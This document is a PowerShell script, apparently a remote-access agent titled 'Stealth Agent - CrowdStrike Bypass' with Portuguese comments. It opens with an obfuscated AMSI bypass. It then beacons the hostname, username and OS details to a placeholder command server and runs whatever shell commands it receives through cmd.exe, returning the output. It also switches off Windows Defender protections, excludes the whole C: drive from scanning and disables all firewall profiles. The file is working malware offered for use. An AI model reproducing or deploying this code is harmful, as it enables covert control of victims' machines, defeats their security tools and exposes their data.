# Stealth Agent - CrowdStrike Bypass
# AMSI Bypass
try {
    $a1=[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.A'+'msiUt'+'ils')
    $a2=$a1.GetField('am'+'siInit'+'Failed','NonPublic,Static')
    $a2.SetValue($null,$true)
} catch {}

# Variáveis
$s1='SERVER_URL_PLACEHOLDER'
$s2='SECRET_TOKEN_PLACEHOLDER'
$s3=[guid]::NewGuid().ToString('N')

Write-Host "[*] Agente iniciado - ID: $s3"
Write-Host "[*] Servidor: $s1"

# Função HTTP
function Invoke-Req {
    param($u,$m='GET',$b=$null)
    try {
        $w=[Net.WebRequest]::Create($u)
        $w.Method=$m
        $w.Headers.Add('Authorization',"Bearer $s2")
        $w.ContentType='application/json'
        if($b){
            $d=[Text.Encoding]::UTF8.GetBytes($b)
            $w.ContentLength=$d.Length
            $st=$w.GetRequestStream()
            $st.Write($d,0,$d.Length)
            $st.Close()
        }
        $r=$w.GetResponse()
        $sr=New-Object IO.StreamReader($r.GetResponseStream())
        $c=$sr.ReadToEnd()
        $sr.Close()
        $r.Close()
        return $c
    }catch{
        Write-Host "[!] HTTP Error: $_"
        return $null
    }
}

# Checkin
function Do-Checkin {
    $d=@{
        token=$s2
        client_id=$s3
        hostname=$env:COMPUTERNAME
        username=$env:USERNAME
        os_version=[Environment]::OSVersion.VersionString
    }|ConvertTo-Json
    Write-Host "[DEBUG] Checkin para: $s1/api/checkin"
    $r=Invoke-Req "$s1/api/checkin" 'POST' $d
    if($r){
        $o=$r|ConvertFrom-Json
        Write-Host "[DEBUG] Resposta: status=$($o.status), tem comando=$($o.command -ne $null)"
        if($o.command){
            Write-Host "[DEBUG] Comando recebido: tipo=$($o.command.type), id=$($o.command_id)"
            return @{id=$o.command_id;type=$o.command.type;params=$o.command.params}
        }
    }
    return $null
}

# Executar Shell
function Run-Cmd {
    param($c)
    try {
        # Executar comando e forçar conversão para string
        $output = & cmd.exe /c $c 2>&1
        if($output){
            $result = ($output | Out-String -Width 4096).Trim()
            return $result
        }
        return "[OK]"
    }catch{
        return "Erro: $_"
    }
}

# Enviar resultado
function Send-Result {
    param($i,$t,$r)
    Write-Host "[*] Preparando envio - ID: $i | Tipo: $t | Tamanho: $($r.Length) chars"
    $d=@{
        token=$s2
        client_id=$s3
        command_id=$i
        command=$t
        result=$r
    }|ConvertTo-Json
    Write-Host "[*] Enviando para: $s1/api/result"
    $resp=Invoke-Req "$s1/api/result" 'POST' $d
    Write-Host "[*] Resposta do servidor: $resp"
}

# Get Info
function Get-Info {
    $o=@()
    $o+="=== SISTEMA ==="
    $o+="Host: $env:COMPUTERNAME"
    $o+="User: $env:USERNAME"
    try{$os=Get-WmiObject Win32_OperatingSystem;$o+="OS: $($os.Caption)"}catch{}
    try{$cpu=Get-WmiObject Win32_Processor|Select -First 1;$o+="CPU: $($cpu.Name)"}catch{}
    try{$ram=[Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);$o+="RAM: ${ram}GB"}catch{}
    try{$mb=Get-WmiObject Win32_BaseBoard;$o+="MB: $($mb.Manufacturer) $($mb.Product)"}catch{}
    try{$gpu=Get-WmiObject Win32_VideoController|Select -First 1;$o+="GPU: $($gpu.Name)"}catch{}
    return $o -join "`n"
}

# Disable Defender
function Dis-Def {
    $r=@()
    try{Set-MpPreference -DisableRealtimeMonitoring $true;$r+="[OK] Real-time off"}catch{$r+="[FAIL] Real-time"}
    try{Set-MpPreference -DisableIOAVProtection $true;$r+="[OK] IOAV off"}catch{$r+="[FAIL] IOAV"}
    try{Set-MpPreference -DisableBehaviorMonitoring $true;$r+="[OK] Behavior off"}catch{$r+="[FAIL] Behavior"}
    try{Add-MpPreference -ExclusionPath "C:\";$r+="[OK] Exclusion C:\"}catch{$r+="[FAIL] Exclusion"}
    return $r -join "`n"
}

# Disable Firewall
function Dis-FW {
    $r=@()
    try{netsh advfirewall set allprofiles state off|Out-Null;$r+="[OK] Firewall off"}catch{$r+="[FAIL] Firewall"}
    return $r -join "`n"
}

# Loop principal
Write-Host "[*] Iniciando loop de checkin..."
$count=0
while($true){
    try{
        $count++
        if($count % 10 -eq 0){
            Write-Host "[*] Checkin #$count"
        }
        $cmd=Do-Checkin
        if($cmd){
            Write-Host "[*] Comando recebido: $($cmd.type)"
            $res=""
            switch($cmd.type){
                'shell'{
                    if($cmd.params.cmd){
                        Write-Host "[*] Executando shell: $($cmd.params.cmd)"
                        $res=Run-Cmd $cmd.params.cmd
                    }
                }
                'get_info'{
                    Write-Host "[*] Coletando informações do sistema"
                    $res=Get-Info
                }
                'disable_defender'{
                    Write-Host "[*] Desativando Defender"
                    $res=Dis-Def
                }
                'disable_firewall'{
                    Write-Host "[*] Desativando Firewall"
                    $res=Dis-FW
                }
                'disable_all'{
                    Write-Host "[*] Desativando tudo"
                    $res=(Dis-Def)+"`n"+(Dis-FW)
                }
                default{$res="Unknown: $($cmd.type)"}
            }
            Write-Host "[*] Enviando resultado (length: $($res.Length))"
            Send-Result $cmd.id $cmd.type $res
        }
        Start-Sleep -Seconds 1
    }catch{
        Write-Host "[!] Erro: $_"
        Start-Sleep -Seconds 1
    }
}

